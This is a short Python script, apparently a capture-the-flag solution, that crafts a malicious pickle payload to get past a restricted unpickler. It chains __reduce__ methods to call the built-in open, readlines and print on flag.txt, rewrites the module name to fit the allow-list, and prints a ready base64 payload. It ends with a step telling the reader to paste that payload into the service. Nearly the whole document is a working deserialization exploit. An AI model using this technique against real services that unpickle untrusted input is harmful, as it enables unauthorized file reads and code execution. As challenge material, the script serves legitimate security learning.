#!/usr/bin/env python3

# From the error message we can see that only __main__, __buitin__ and copyreg are allowed
# __builtin__.eval and __builtin__.exec are banned as well
# We can just open and print the flag.txt by using __builin__.open, followed by readline and print
# This sequence of calls is constructed below by using multiple objects and the pickle __reduce__ interface

import base64
import builtins
import pickle

class FlagObjPickle:
    def __reduce__(self):
        return builtins.open, ("./flag.txt",)
    def readlines(self):
        pass

class ReadFlagPickle:
    def __reduce__(self):
        return FlagObjPickle().readlines, tuple()

class PrintFlagPickle:
    def __reduce__(self):
        return builtins.print, (ReadFlagPickle(),)

a = PrintFlagPickle()
pickled = pickle.dumps(a, 0)

# pickle.dumps changes builtins.print to cio.print, but __builtin__.print works as well and is required by the challenge
pickled = pickled.replace(b"cio", b"c__builtin__") 


print(base64.b64encode(pickled).decode())
# Y19fYnVpbHRpbl9fCnByaW50CnAwCihjX19idWlsdGluX18KZ2V0YXR0cgpwMQooY19fYnVpbHRpbl9fCm9wZW4KcDIKKFYuL2ZsYWcudHh0CnAzCnRwNApScDUKVnJlYWRsaW5lcwpwNgp0cDcKUnA4Cih0UnA5CnRwMTAKUnAxMQou


# Connect to the service and press 'l' and paste the above